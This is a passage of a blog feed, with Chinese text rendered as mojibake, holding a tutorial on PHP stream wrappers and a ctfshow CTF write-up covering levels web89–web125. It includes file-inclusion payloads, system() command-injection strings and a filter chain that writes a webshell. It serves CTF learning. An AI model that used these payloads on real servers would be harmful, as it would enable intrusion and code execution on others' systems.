        <content type="html"><![CDATA[<h3 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/224159.png" class=""><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>p:&#x2F;&#x2F;filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€file()ã€include()ã€highlight_file()å’Œfile_get_contents()ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</p><p>ç®€å•é€šä¿—çš„è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸­é—´ä»¶ï¼Œåœ¨è¯»å…¥æˆ–å†™å…¥æ•°æ®çš„æ—¶å€™å¯¹æ•°æ®è¿›è¡Œå¤„ç†åè¾“å‡ºçš„ä¸€ä¸ªè¿‡ç¨‹ã€‚</p><p>php:&#x2F;&#x2F;filter ç›®æ ‡ä½¿ç”¨ä»¥ä¸‹çš„å‚æ•°ä½œä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚ å¤åˆè¿‡æ»¤é“¾èƒ½å¤Ÿåœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚</p><p><strong>åè®®å‚æ•°</strong>ï¼š</p><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/120759.png" class=""><p><strong>è¿‡æ»¤å™¨</strong></p><p>è¿™é‡Œåªä¾‹ä¸¾å¸¸ç”¨è¿‡æ»¤å™¨ï¼Œè¯¦æƒ…è¯·å‚è€ƒ<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/123006.png" class=""><p>å¸¸ç”¨ï¼š</p><pre><code>1.php://filter/read=convert.base64-encode/resource=index.php2.php://filter/resource=index.php</code></pre><p>åˆ©ç”¨filteråè®®è¯»æ–‡ä»¶ï¼Œå°†index.phpé€šè¿‡base64ç¼–ç åè¿›è¡Œè¾“å‡ºã€‚è¿™æ ·åšçš„å¥½å¤„å°±æ˜¯å¦‚æœä¸è¿›è¡Œç¼–ç ï¼Œæ–‡ä»¶åŒ…å«åå°±ä¸ä¼šæœ‰è¾“å‡ºç»“æœï¼Œè€Œæ˜¯å½“åšphpæ–‡ä»¶æ‰§è¡Œäº†ï¼Œè€Œé€šè¿‡ç¼–ç ååˆ™å¯ä»¥è¯»å–æ–‡ä»¶æºç ã€‚</p><h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸<strong>åŒ…å«å‡½æ•°</strong>ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚</p><p>ç”¨æ³•ï¼š</p><pre><code class="awk">data://text/plain,data://text/plain;base64,</code></pre><p>æ ¼å¼ï¼šdata:èµ„æºç±»å‹(MIMEç±»å‹);ç¼–ç ,å†…å®¹</p><p>ç¤ºä¾‹ï¼š</p><pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>dataç±»å‹æ‰©å±•</p><pre><code>data:,&lt;æ–‡æœ¬æ•°æ®&gt;data:text/plain,&lt;æ–‡æœ¬æ•°æ®&gt;data:text/html,&lt;HTMLä»£ç &gt;data:text/html;base64,&lt;base64ç¼–ç çš„HTMLä»£ç &gt;data:text/css,&lt;CSSä»£ç &gt;data:text/css;base64,&lt;base64ç¼–ç çš„CSSä»£ç &gt;data:text/javascript,&lt;Javascriptä»£ç &gt;data:text/javascript;base64,&lt;base64ç¼–ç çš„Javascriptä»£ç &gt;data:image/gif;base64,base64ç¼–ç çš„gifå›¾ç‰‡æ•°æ®data:image/png;base64,base64ç¼–ç çš„pngå›¾ç‰‡æ•°æ®data:image/jpeg;base64,base64ç¼–ç çš„jpegå›¾ç‰‡æ•°æ®data:image/x-icon;base64,base64ç¼–ç çš„iconå›¾ç‰‡æ•°æ®</code></pre><h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><strong>php:&#x2F;&#x2F;input</strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>ä¾‹å¦‚ï¼š</p><pre><code>http://127.0.0.1/cmd.php?cmd=php://inputPOSTæ•°æ®ï¼š&lt;?php phpinfo();?&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpç‰¹æ€§(ctfshow)</title>
      <link href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"/>
      <url>/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>preg_match()åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„æ˜¯æ•°ç»„æ—¶å°†ä¼šè¿”å›false</p><p><strong>intval(mixed $value, int $base &#x3D; 10): int</strong></p><p>é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ value çš„ int æ•°å€¼ã€‚ <strong>intval()</strong> ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/155817.png" class=""><p>æ³¨ï¼šé™¤évalueæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™baseä¸ä¼šèµ·ä½œç”¨</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/155907.png" class=""><pre><code>payload:?num[]=1</code></pre><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>è¿˜æ˜¯è€ƒå¯Ÿintvalå‡½æ•°ï¼Œçœ‹æºç ï¼š</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/161305.png" class=""><pre><code>payload:?num=0x117c      #0x117cæ˜¯4476çš„16è¿›åˆ¶</code></pre><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><p>å…ˆçœ‹æºç ï¼š</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/213407.png" class=""><p>é¦–å…ˆæ˜¯ï¼š</p><p>if(preg_match(â€˜&#x2F;^php$&#x2F;imâ€™, $a))</p><p>&#x2F;^php$&#x2F;im è¡¨ç¤ºç”¨phpåŒ¹é…å¼€å¤´å’Œç»“å°¾ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œå¹¶ä¸”å¤šè¡ŒåŒ¹é…</p><p>å†æ¬¡ï¼š</p><p>if(preg_match(â€˜&#x2F;^php$&#x2F;iâ€™, $a))</p><p>ä¸ä¸Šé¢çš„åŒºåˆ«æ˜¯æ²¡æœ‰å¤šè¡ŒåŒ¹é…ï¼Œè¿™å¯ä»¥ç”¨åˆ°Apache HTTPDæ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰â€“(<a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a>)</p><pre><code>payload:?cmd=abc%0aphp</code></pre><p>a%0aphpï¼Œé¦–å…ˆæ˜¯preg_matchä¸­çš„$(åŒ¹é…ç»“å°¾)åŒ¹é…a%0aphpä¸­çš„æ¢è¡Œç¬¦ï¼Œè¿™ä¸ªæ—¶å€™ä¼šåŒ¹é…åˆ°%0aï¼ˆå°†%0aå½“ä½œæ¢è¡Œï¼‰ï¼Œé‚£ä¹ˆa%0aphpåé¢çš„phpå› ä¸ºpreg_matchå‡½æ•°æœ‰ä¸ª&#x2F;m(åŒ¹é…å¤šè¡Œ)å°±æ˜¯å•ç‹¬çš„ä¸€è¡Œäº†ï¼Œæ»¡è¶³ç¬¬ä¸€ä¸ªifï¼Œè¦æ±‚è¡Œå¼€å§‹å’Œç»“å°¾éƒ½æ˜¯php</p><p>å…¶æ¬¡æ˜¯ç¬¬äºŒä¸ªifï¼Œç¬¬äºŒä¸ªifè¦æ±‚$aä¸­å¼€å¤´å’Œç»“å°¾æ²¡æœ‰phpï¼Œè€Œè¿™ä¸ªpreg_matchå‡½æ•°ä¸­æ²¡æœ‰&#x2F;måŒ¹é…å¤šè¡Œï¼Œæ‰€ä»¥å°±ç›´æ¥åŒ¹é…abcï¼Œabcä¸æ»¡è¶³ç¬¬äºŒä¸ªifï¼Œæ‰€ä»¥è¾“å‡ºflag</p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><p>è¿˜æ˜¯è€ƒå¯Ÿintval()å‡½æ•°ç‰¹æ€§</p><pre><code>pyload:?cmd=4476.1</code></pre><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><p>è¿™é‡Œè¿‡æ»¤äº†a-zå’ŒA-Zï¼Œä¸èƒ½ç”¨16è¿›åˆ¶ç¼–ç ï¼Œä½†èƒ½ç”¨8è¿›åˆ¶ç¼–ç ï¼Œç”¨å°æ•°ä¹Ÿå¯ä»¥ç»•è¿‡ã€‚è¿™é‡Œæˆ‘ä»¬ç”¨8è¿›åˆ¶ç¼–ç ä¸€ä¸‹</p><pre><code>payload:?cmd=010574</code></pre><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><p>çœ‹æºç </p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/223456.png" class=""><p>è¿™é‡Œå¢åŠ äº†strpos()å‡½æ•°</p><p><strong>strpos(string $haystack, string $needle, int $offset &#x3D; 0): int|false</strong></p><p>è¿”å› needle åœ¨ haystack ä¸­é¦–æ¬¡å‡ºç°çš„æ•°å­—ä½ç½®ã€‚å¦‚æœæä¾›äº†$offsetå‚æ•°ï¼Œæœç´¢ä¼šä»å­—ç¬¦ä¸²è¯¥å­—ç¬¦æ•°çš„èµ·å§‹ä½ç½®å¼€å§‹ç»Ÿè®¡ã€‚ å¦‚æœæ˜¯è´Ÿæ•°ï¼Œæœç´¢ä¼šä»å­—ç¬¦ä¸²ç»“å°¾æŒ‡å®šå­—ç¬¦æ•°å¼€å§‹ã€‚</p><p>æ‰€ä»¥ï¼Œè¿™é‡Œçš„if(!strpos($num, â€œ0â€))æ˜¯è¿‡æ»¤äº†å‡ºç°åœ¨å­—ç¬¦ä¸²é¦–ä½çš„0ï¼Œå³å±è”½äº†8è¿›åˆ¶</p><pre><code>payload:?num=4476.01</code></pre><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><p>è¿™å…³ç›´æ¥è¿‡æ»¤äº†ç‚¹ï¼Œå‘ç°ç”¨+å·å¯ä»¥ç»•è¿‡</p><pre><code>payload:?cmd=+010574 æˆ– ?cmd=%2b010574</code></pre><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><p>è¿™é‡Œç”¨ç›¸å¯¹è·¯å¾„</p><pre><code>payload:?u=./flag.php</code></pre><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><p>æ•°ç»„ç»•è¿‡</p><pre><code>POST a[]=1&amp;b[]=2</code></pre><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><p>ç”±æºç å«ä¹‰å¯æ„é€ payload:</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/110924.png" class=""><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>çœ‹æºç ï¼š</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113547.png" class=""><p><strong>in_array()</strong></p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113721.png" class=""><p><strong>file_put_contents()</strong></p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113902.png" class=""><p>ç›´æ¥æ„é€ ï¼Œç„¶åç”¨èšå‰‘è¿æ¥</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/115539.png" class=""><p>getæ•°æ®å¯ä»¥å¤šæ¬¡å°è¯•</p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><p>æºç ï¼š</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/142455.png" class=""><p><strong>is_numeric(mixed $value): bool</strong></p><p>æ£€æµ‹æŒ‡å®šçš„å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚</p><p>è¿™é¢˜çš„é‡ç‚¹æ˜¯and orå’Œ&amp;&amp; ||çš„åŒºåˆ«ï¼ŒåŒºåˆ«æ˜¯ä¼˜å…ˆçº§ä¸åŒï¼Œåè€…çš„ä¼˜å…ˆçº§é«˜äº&#x3D;ï¼Œå‰è€…çš„ä¼˜å…ˆçº§ä½äº&#x3D;ã€‚æ‰€ä»¥è¿™é‡Œåªè¦æ„é€ v1ç­‰äºä¸€ä¸ªæ•°å­—å³å¯ã€‚</p><pre><code>?v1=23&amp;v2=system(&#39;ls&#39;)&amp;v3=;?v1=1&amp;v2=system(&quot;tac ctfshow.php&quot;)&amp;v3=;?v1=1&amp;v2=highlight_file(&quot;ctfshow.php&quot;)&amp;v3=;?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><p>è¿™ä¸€å…³å‡ ä¹æ‰€æœ‰èƒ½ç”¨çš„éƒ½è¿‡æ»¤äº†ï¼Œè¿™é‡Œè¦ç”¨åˆ°ReflectionClassåå°„ç±»ã€‚</p><p>å‚è€ƒ:<a href="https://www.php.net/manual/zh/class.reflectionclass.php">https://www.php.net/manual/zh/class.reflectionclass.php</a></p><p>â€‹<a href="https://www.cnblogs.com/benbenhan/p/12572649.html">https://www.cnblogs.com/benbenhan/p/12572649.html</a></p><p>æœ€ç®€å•çš„æ–¹æ³•ç›´æ¥è¾“å‡ºè¿™ä¸ªç±»å³å¯ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡º echo new ReflectionClass(â€˜ctfshowâ€™);</p><pre><code>payload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><p>å…ˆçœ‹æºç ï¼š</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/162642.png" class=""><p><strong>call_user_func(callable $callback,mixed â€¦$args):mixed</strong></p><p>ç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</p><p>æˆ‘ä»¬æ¢³ç†ä¸€ä¸‹è¿™ä¸€å…³çš„æ€è·¯ï¼šé¦–å…ˆv3å¾—æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œç„¶åv2åº”è¯¥æ˜¯ä¸€å¥è¯ï¼Œä½†è¿™é‡Œè¦ç»•è¿‡is_numeric()ï¼Œå¹¶ä¸”è¦ç»è¿‡åä¸ºv1çš„å‡½æ•°è½¬æ¢ï¼Œæ‰€ä»¥v2å¾—æ˜¯ä¸€å¥è¯ç»è¿‡å¤„ç†æˆä¸ºçº¯æ•°å­—ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰v2&#x3D;â€™&lt;?&#x3D;<code>cat *</code>;â€™;,å†ç»è¿‡base64å’Œ16è¿›åˆ¶ç¼–ç åæˆä¸ºPD89YGNhdCAqYDs&#x3D;,ç­‰å·åœ¨base64ä¸­åªæ˜¯èµ·åˆ°å¡«å……çš„ä½œç”¨ï¼Œä¸å½±å“å…·ä½“çš„æ•°æ®å†…å®¹ï¼Œç›´æ¥ç”¨å»æ‰ï¼Œå†è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå¾—åˆ°5044383959474e6864434171594473ï¼ˆæ³¨ï¼šå¦‚æœæ­¤å¤„ä½¿ç”¨bin2hex()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å…ˆå°†å­—ç¬¦ä¸²çš„asciiå¯¹åº”çš„äºŒè¿›åˆ¶æ‰¾å‡ºæ¥ï¼Œå†å°†äºŒè¿›åˆ¶ç è½¬æ¢æˆ16è¿›åˆ¶ï¼Œæ‰€ä»¥å¦‚æœç”¨åœ¨çº¿ç¼–ç è½¬æ¢çš„è¯åº”å…ˆå°†å­—ç¬¦ä¸²å…ˆbase64ç¼–ç ï¼Œå†ç”¨asciiè½¬16è¿›åˆ¶ï¼‰ã€‚</p><p>è¿™ä¸€å…³è¦ä½¿ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®ã€‚</p><pre><code>payload:GET v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64- decode/resource=1.php         POST v1=hex2bin</code></pre><p>æœ€åå†è®¿é—®1.phpã€‚</p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><p>åŒä¸Š</p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><pre><code>payload: GET v2=ddd         POST v1=ddd</code></pre><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/205755.png" class=""><p>è€ƒå¯Ÿå˜é‡è¦†ç›–ï¼Œè¿™é‡Œæœ‰ä¸ªphpçš„å°ç‰¹æ€§å°±æ˜¯å˜é‡ä¸éœ€è¦å£°æ˜</p><pre><code>payload GET a=flag        POST error=a</code></pre><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><p>å‚è€ƒ<a href="https://blog.csdn.net/qq_19980431/article/details/83018232">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p><pre><code>payload: GET v2[]=1         POST v1[]=2</code></pre><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><p><strong>parse_str(string $string, array &amp;$result): void</strong></p><p>å¦‚æœ string æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† <code>result</code> åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ã€‚</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/215655.png" class=""><pre><code>payload: GET v3=QNKCDZO         POST v1=flag=0</code></pre><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><p>è€ƒå¯Ÿereg()æˆªæ–­æ¼æ´.å‚è€ƒ:<a href="https://blog.csdn.net/qq_25987491/article/details/79952393">https://blog.csdn.net/qq_25987491/article/details/79952393</a></p><p>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦å¤§å°å†™æ•æ„Ÿ</p><p>è¿™é‡Œeregæœ‰ä¸¤ä¸ªæ¼æ´ï¼š<br>â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ<br>â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE</p><p>æ•°ç»„ç»•è¿‡åŒ¹é…:<br>ç¬¬ä¸€æ­¥é¦–å…ˆè¦è¿‡eregï¼Œå¯ä»¥ç”¨%00æˆªæ–­<br>ç¬¬äºŒéƒ¨0x36dæ˜¯åè¿›åˆ¶877ï¼Œé€†æ“ä½œç»è¿‡strrevä¸º778</p><pre><code>payload c=a%00778</code></pre><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><p>åªè¦è®©newåé¢æœ‰ä¸ªç±»ä¸æŠ¥é”™ä»¥åï¼Œå°±å¯ä»¥éšæ„æ„é€ </p><pre><code>?v1=Exception();system(&quot;ls&quot;);//&amp;v2=a?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);//&amp;v2=a</code></pre><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><p>è€ƒå¯ŸFilesystemIteratorç±»</p><pre><code>payload ?v1=FilesystemIterator&amp;v2=getcwd</code></pre><p>ç¼ºé™·æ˜¯å¦‚æœflagçš„æ–‡ä»¶ä¸åœ¨ç¬¬ä¸€ä½çš„è¯ï¼Œå°±ä¸èƒ½å¾—åˆ°è¿™ä¸ªæ–‡ä»¶åã€‚</p><p><strong>getcwd(): string|false</strong></p><p>å–å¾—å½“å‰å·¥ä½œç›®å½•ã€‚</p><p><strong>FilesystemIterator</strong> éå†æ–‡ä»¶çš„ç±» </p><p><strong>DirctoryIntrerator</strong> éå†ç›®å½•çš„ç±»</p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><p>è¿™é‡Œç”¨å…¨å±€å˜é‡GLOBALS</p><p>$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</p><p>æ³¨ï¼šåœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰çš„å˜é‡ï¼Œæ‹¥æœ‰å…¨å±€ä½œç”¨åŸŸã€‚é™¤äº†å‡½æ•°å¤–ï¼Œå…¨å±€å˜é‡å¯ä»¥è¢«è„šæœ¬ä¸­çš„ä»»ä½•éƒ¨åˆ†è®¿é—®ï¼Œè¦åœ¨ä¸€ä¸ªå‡½æ•°ä¸­è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œéœ€è¦ä½¿ç”¨ global å…³é”®å­—ã€‚æ‰€ä»¥è¿™é‡Œv2è¦ç”¨è¶…å…¨å±€å˜é‡GLOBALS,ä¸èƒ½ç›´æ¥ç”¨flagã€‚</p><pre><code>payload  ?v1=ctfshow&amp;v2=GLOBALS</code></pre><h5 id="ä½¿ç”¨è¶…å…¨å±€å˜é‡-GLOBALSå¯ä»¥ä»£æ›¿global"><a href="#ä½¿ç”¨è¶…å…¨å±€å˜é‡-GLOBALSå¯ä»¥ä»£æ›¿global" class="headerlink" title="ä½¿ç”¨è¶…å…¨å±€å˜é‡$GLOBALSå¯ä»¥ä»£æ›¿global"></a>ä½¿ç”¨è¶…å…¨å±€å˜é‡$GLOBALSå¯ä»¥ä»£æ›¿global</h5><pre><code>&lt;?php      $num1 = 5;      //å…¨å±€å˜é‡     $num2 = 13;     //å…¨å±€å˜é‡    function global_var()      &#123;              $sum = $GLOBALS[&#39;num1&#39;] + $GLOBALS[&#39;num2&#39;];              echo &quot;å…¨å±€å˜é‡æ±‚å’Œç»“æœ &quot; .$sum;      &#125;      global_var();  ?&gt;  </code></pre><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><p><strong>is_file(string $filename): bool</strong></p><p>å¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”ä¸ºæ­£å¸¸çš„æ–‡ä»¶åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p><p>è¿™ä¸€å…³è¦ä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶åè¿˜è¦æŠŠæ–‡ä»¶å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯ç”¨phpä¼ªåè®®ã€‚</p><pre><code>payload ?file=php://filter/resource=flag.php</code></pre><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><p>è¿™é¢˜ç”¨åˆ°ä¼ªåè®®zlib:&#x2F;&#x2F;</p><pre><code>payload ?file=compress.zlib://flag.php</code></pre><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><p>æ²¡æœ‰è¿‡æ»¤phpå’Œfilter</p><pre><code>?file=php://filter/resource=flag.php</code></pre><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/214923.png" class=""><p>è¿™ä¸€å…³ç”¨%0cæ¥ç»•è¿‡trim()å‡½æ•°</p><pre><code>payload ?num=%0c36</code></pre><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><p>è¿™ä¸€å…³æ¯”è¾ƒå®¹æ˜“æƒ³å‡ºæ¥fun&#x3D;echo $flagï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œé€šè¿‡æ’æŸ¥å‘ç°æ˜¯$CTF_SHOW.COMçš„é—®é¢˜ï¼Œçœ‹åˆ«äººé¢˜è§£æœç„¶æ˜¯ï¼Œå¹¶ä¸”æ˜¯å› ä¸ºæ˜¯å˜é‡é‡Œæœ‰ä¸ªç‚¹ï¼š</p><p>åœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸º_ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡ºCTF_SHOW.COMè¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰.)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º_ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p><p>å¯ä»¥å‚è€ƒä¸€ä¸‹y4çš„åšå®¢<a href="https://blog.csdn.net/solitudi/article/details/120502141">https://blog.csdn.net/solitudi/article/details/120502141</a></p><p> (åæ­£æˆ‘ä¹Ÿçœ‹ä¸æ‡‚)ï¼Œæ€»ä¹‹å…ˆè®°ä½è¿™ä¸ªæ€§è´¨ã€‚å…¶å®å‡ºç°äº†[ä¹‹åphpå°±ä¼šå»æ‰¾]ï¼Œå¦‚æœæ‰¾åˆ°äº†é‚£å°±æ˜¯æ•°ç»„ï¼Œæ²¡æœ‰æ‰¾åˆ°å°±è¢«è¢«è§£ææˆ_</p><pre><code>payload CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></pre><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><p>è¿™ä¸€å…³å±è”½äº†echoã€flagã€‚æˆ‘ä»¬è¿™é‡Œç”¨åˆ›é€ ä¸€ä¸ªæ–°å˜é‡ï¼Œå·§å¦™åˆ©ç”¨highlight_file()</p><pre><code>payload CTF_SHOW=fds&amp;CTF[SHOW.COM=dfds&amp;fun=highlight_file($_POST[fff])&amp;fff=flag.php</code></pre><h3 id="web126"><a href="#web126" class="headerlink" 